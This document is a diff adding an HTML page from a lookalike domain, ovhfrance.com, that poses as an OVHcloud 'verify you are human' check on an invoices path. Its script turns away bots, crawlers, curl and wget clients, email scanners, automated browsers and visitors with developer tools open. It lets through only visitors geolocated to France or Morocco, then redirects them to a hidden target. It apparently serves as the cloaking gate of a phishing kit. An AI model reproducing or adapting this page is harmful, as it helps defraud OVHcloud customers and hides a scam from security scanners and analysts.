@@ -1,0 +1,580 @@
+<!-- url: https://ovhfrance.com/mesfactures/FR2025-17-12/
+status: 200 -->
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <title>Vérification de sécurité - OVHcloud</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            background: #F6F8FA;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            color: #333333;
+            line-height: 1.6;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        /* Header */
+        .header {
+            padding: 24px 0;
+            background: #ffffff;
+            border-bottom: 1px solid #e5e5e5;
+        }
+
+        .header-content {
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: flex;
+            justify-content: center;
+        }
+
+        .site-logo {
+            height: 40px;
+            width: auto;
+        }
+
+        /* Main Container */
+        .main {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 20px;
+        }
+
+        .verification-box {
+            background: #ffffff;
+            max-width: 500px;
+            width: 100%;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
+            text-align: center;
+        }
+
+        /* Icon */
+        .icon-container {
+            margin-bottom: 32px;
+        }
+
+        .shield-icon {
+            width: 72px;
+            height: 72px;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #F0F7FF;
+            border-radius: 50%;
+        }
+
+        .shield-icon svg {
+            width: 36px;
+            height: 36px;
+            fill: #0083FF;
+        }
+
+        /* Typography */
+        .title {
+            font-size: 24px;
+            font-weight: 600;
+            color: #333333;
+            margin-bottom: 12px;
+            line-height: 1.3;
+        }
+
+        .description {
+            font-size: 16px;
+            color: #666666;
+            margin-bottom: 32px;
+            line-height: 1.5;
+        }
+
+        /* Button */
+        .hold-button {
+            width: 100%;
+            max-width: 280px;
+            height: 48px;
+            font-size: 16px;
+            font-weight: 600;
+            color: #ffffff;
+            background: #0083FF;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            position: relative;
+            overflow: hidden;
+            transition: all 0.2s ease;
+            user-select: none;
+            -webkit-user-select: none;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto;
+        }
+
+        .hold-button:hover {
+            background: #0072E5;
+        }
+
+        .hold-button:active {
+            transform: scale(0.98);
+        }
+
+        .hold-button.holding {
+            background: #0056B3;
+        }
+
+        .hold-button.success {
+            background: #16A34A;
+            border-color: #16A34A;
+        }
+
+        .hold-button:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+            background: #0083FF;
+        }
+
+        /* Progress bar inside button */
+        .button-progress {
+            position: absolute;
+            top: 0;
+            left: 0;
+            height: 100%;
+            width: 0%;
+            background: rgba(255, 255, 255, 0.2);
+            transition: none;
+            pointer-events: none;
+        }
+
+        /* Loading dots */
+        .loading-dots {
+            display: none;
+            margin: 32px 0;
+        }
+
+        .loading-dots.show {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .dot {
+            width: 8px;
+            height: 8px;
+            background: #0083FF;
+            border-radius: 50%;
+            animation: dotPulse 1.4s ease-in-out infinite;
+        }
+
+        .dot:nth-child(1) { animation-delay: -0.32s; }
+        .dot:nth-child(2) { animation-delay: -0.16s; }
+        .dot:nth-child(3) { animation-delay: 0; }
+
+        @keyframes dotPulse {
+            0%, 80%, 100% {
+                background: #0083FF;
+                transform: scale(1);
+            }
+            40% {
+                background: #0056B3;
+                transform: scale(1.2);
+            }
+        }
+
+        /* Success checkmark */
+        .success-icon {
+            display: none;
+            width: 72px;
+            height: 72px;
+            margin: 0 auto 24px;
+            background: #F0FDF4;
+            border-radius: 50%;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .success-icon.show {
+            display: flex;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .success-icon svg {
+            width: 36px;
+            height: 36px;
+            fill: #16A34A;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.9); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+        /* Error message */
+        .error-message {
+            display: none;
+            margin-top: 16px;
+            padding: 12px 16px;
+            background: #FEF2F2;
+            border: 1px solid #FECACA;
+            border-radius: 6px;
+            font-size: 14px;
+            color: #DC2626;
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
+        /* Footer */
+        .footer {
+            padding: 24px 20px;
+            text-align: center;
+            border-top: 1px solid #e5e5e5;
+            background: #ffffff;
+        }
+
+        .footer-text {
+            font-size: 13px;
+            color: #666666;
+            line-height: 1.5;
+        }
+
+        .footer-id {
+            margin-top: 8px;
+            font-size: 11px;
+            color: #999999;
+            font-family: 'SF Mono', Monaco, 'Courier New', monospace;
+        }
+
+        /* Mobile */
+        @media (max-width: 480px) {
+            .verification-box {
+                padding: 30px 20px;
+            }
+
+            .title {
+                font-size: 20px;
+            }
+
+            .description {
+                font-size: 15px;
+            }
+
+            .hold-button {
+                max-width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <header class="header">
+        <div class="header-content">
+            <img src="https://ovhfrance.com/mesfactures/FR2025-17-12/domains/mobile-logo.png" alt="OVHcloud" class="site-logo">
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="main">
+        <div class="verification-box">
+            <!-- Initial State -->
+            <div id="initialContent">
+                <div class="icon-container">
+                    <div class="shield-icon">
+                        <svg viewBox="0 0 24 24">
+                            <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/>
+                        </svg>
+                    </div>
+                </div>
+
+                <h1 class="title">Vérifiez que vous êtes humain</h1>
+                <p class="description">Appuyez et maintenez le bouton ci-dessous pour continuer</p>
+
+                <button class="hold-button" id="holdButton">
+                    <span id="buttonText">Appuyer & Maintenir</span>
+                    <div class="button-progress" id="buttonProgress"></div>
+                </button>
+
+                <div class="error-message" id="errorMessage">
+                    La vérification a échoué. Veuillez réessayer.
+                </div>
+            </div>
+
+            <!-- Loading State -->
+            <div class="loading-dots" id="loadingDots">
+                <div class="dot"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
+            </div>
+
+            <!-- Success State -->
+            <div id="successContent" style="display: none;">
+                <div class="success-icon show">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/>
+                    </svg>
+                </div>
+                <h1 class="title">Succès</h1>
+                <p class="description">Redirection...</p>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-text">
+            Cette vérification de sécurité aide à protéger notre site contre les accès automatisés.
+        </div>
+        <div class="footer-id" id="footerId">ID: </div>
+    </footer>
+
+    <script>
+        // Configuration
+        let CONFIG = {
+            enabled: 'on',
+            targetFile: 'domains',
+            holdDuration: 2000, // 2 seconds
+            blockBots: 'on',
+            blockCrawlers: 'off',
+            blockEmailBots: 'on',
+            blockDevTools: 'on',
+            geoBlock: 'on',
+            allowedCountries: ['FR', 'MA'],
+            rateLimit: 'on',
+            rateLimitMs: 1000
+        };
+
+        // Generate ID
+        const genId = () => {
+            return Date.now().toString(36) + Math.random().toString(36).substr(2, 9);
+        };
+        document.getElementById('footerId').textContent = 'ID: ' + genId();
+
+        // Helper
+        const isEnabled = (setting) => setting === 'on' || setting === true;
+
+        // Load config
+        const loadConfig = () => {
+            const script = document.createElement('script');
+            script.src = 'config.js?t=' + Date.now();
+            script.onload = () => {
+                if (window.SECURITY_CONFIG) {
+                    CONFIG = { ...CONFIG, ...window.SECURITY_CONFIG };
+                }
+                init();
+            };
+            script.onerror = () => {
+                console.log('Using defaults');
+                init();
+            };
+            document.head.appendChild(script);
+        };
+
+        // Bot patterns
+        const botPatterns = {
+            bots: [/bot/i, /crawl/i, /spider/i, /scrape/i, /wget/i, /curl/i],
+            crawlers: [/googlebot/i, /bingbot/i, /yandex/i, /facebook/i],
+            email: [/mail/i, /harvest/i, /extract/i]
+        };
+
+        // Security checks
+        class Verify {
+            check() {
+                const ua = navigator.userAgent.toLowerCase();
+                
+                // Check user agent
+                if (isEnabled(CONFIG.blockBots)) {
+                    for (let p of botPatterns.bots) {
+                        if (p.test(ua)) return 'Bot détecté';
+                    }
+                }
+                
+                if (isEnabled(CONFIG.blockCrawlers)) {
+                    for (let p of botPatterns.crawlers) {
+                        if (p.test(ua)) return 'Crawler détecté';
+                    }
+                }
+                
+                if (isEnabled(CONFIG.blockEmailBots)) {
+                    for (let p of botPatterns.email) {
+                        if (p.test(ua)) return 'Bot email détecté';
+                    }
+                }
+                
+                // Check browser
+                if (navigator.webdriver) return 'Navigateur automatisé';
+                if (screen.width === 0) return 'Écran invalide';
+                if (!navigator.plugins.length && !ua.match(/mobile|android|iphone/i)) {
+                    return 'Navigateur invalide';
+                }
+                
+                // Rate limit
+                if (isEnabled(CONFIG.rateLimit)) {
+                    const last = sessionStorage.getItem('_vt');
+                    if (last && Date.now() - parseInt(last) < CONFIG.rateLimitMs) {
+                        return 'Trop de tentatives';
+                    }
+                    sessionStorage.setItem('_vt', Date.now());
+                }
+                
+                return null;
+            }
+
+            async checkGeo() {
+                if (!isEnabled(CONFIG.geoBlock)) return null;
+                try {
+                    const cc = await fetch('https://ipapi.co/country_code/').then(r => r.text());
+                    if (cc && !CONFIG.allowedCountries.includes(cc.trim())) {
+                        return 'Localisation non autorisée';
+                    }
+                } catch (e) {}
+                return null;
+            }
+        }
+
+        // Button logic
+        const button = document.getElementById('holdButton');
+        const buttonText = document.getElementById('buttonText');
+        const progress = document.getElementById('buttonProgress');
+        let holdTimer, startTime, holding = false, verified = false;
+
+        function startHold(e) {
+            e.preventDefault();
+            if (verified) return;
+            
+            holding = true;
+            startTime = Date.now();
+            button.classList.add('holding');
+            buttonText.textContent = 'Maintenir...';
+            
+            animateProgress();
+            
+            holdTimer = setTimeout(() => {
+                if (holding) verify();
+            }, CONFIG.holdDuration);
+        }
+
+        function endHold() {
+            if (!holding || verified) return;
+            
+            holding = false;
+            clearTimeout(holdTimer);
+            button.classList.remove('holding');
+            buttonText.textContent = 'Appuyer & Maintenir';
+            progress.style.width = '0%';
+            
+            if (startTime && Date.now() - startTime < 500) {
+                showError();
+            }
+        }
+
+        function animateProgress() {
+            if (!holding) return;
+            const pct = Math.min(((Date.now() - startTime) / CONFIG.holdDuration) * 100, 100);
+            progress.style.width = pct + '%';
+            if (pct < 100) requestAnimationFrame(animateProgress);
+        }
+
+        function showError() {
+            document.getElementById('errorMessage').classList.add('show');
+            setTimeout(() => {
+                document.getElementById('errorMessage').classList.remove('show');
+            }, 3000);
+        }
+
+        async function verify() {
+            verified = true;
+            button.classList.remove('holding');
+            button.classList.add('success');
+            buttonText.textContent = '✓';
+            
+            // Show loading
+            setTimeout(() => {
+                document.getElementById('initialContent').style.display = 'none';
+                document.getElementById('loadingDots').classList.add('show');
+            }, 300);
+            
+            // Check security
+            const v = new Verify();
+            const err = v.check() || await v.checkGeo();
+            
+            if (err) {
+                // Failed
+                setTimeout(() => {
+                    document.getElementById('loadingDots').classList.remove('show');
+                    document.getElementById('initialContent').style.display = 'block';
+                    button.classList.remove('success');
+                    buttonText.textContent = 'Appuyer & Maintenir';
+                    document.getElementById('errorMessage').textContent = err;
+                    document.getElementById('errorMessage').classList.add('show');
+                    verified = false;
+                }, 1500);
+            } else {
+                // Success
+                setTimeout(() => {
+                    document.getElementById('loadingDots').classList.remove('show');
+                    document.getElementById('successContent').style.display = 'block';
+                    setTimeout(() => {
+                        window.location.replace(CONFIG.targetFile);
+                    }, 1500);
+                }, 1500);
+            }
+        }
+
+        // Dev tools detect
+        function detectDev() {
+            if (!isEnabled(CONFIG.blockDevTools)) return;
+            setInterval(() => {
+                if (window.outerHeight - window.innerHeight > 160 || 
+                    window.outerWidth - window.innerWidth > 160) {
+                    button.disabled = true;
+                    buttonText.textContent = 'Bloqué';
+                }
+            }, 500);
+        }
+
+        // Initialize
+        function init() {
+            // Quick bot check
+            const v = new Verify();
+            const err = v.check();
+            if (err && isEnabled(CONFIG.enabled)) {
+                document.getElementById('initialContent').innerHTML = `
+                    <div style="padding: 20px;">
+                        <h2 style="color: #dc2626; font-size: 20px; margin-bottom: 8px;">Accès refusé</h2>
+                        <p style="color: #737373; font-size: 14px;">${err}</p>
+                    </div>`;
+                return;
+            }
+            
+            // Setup button
+            button.addEventListener('mousedown', startHold);
+            button.addEventListener('mouseup', endHold);
+            button.addEventListener('mouseleave', endHold);
+            button.addEventListener('touchstart', startHold);
+            button.addEventListener('touchend', endHold);
+            button.addEventListener('contextmenu', e => e.preventDefault());
+            
+            detectDev();
+        }
+
+        // Start
+        document.addEventListener('DOMContentLoaded', loadConfig);
+    </script>
+</body>
+</html>
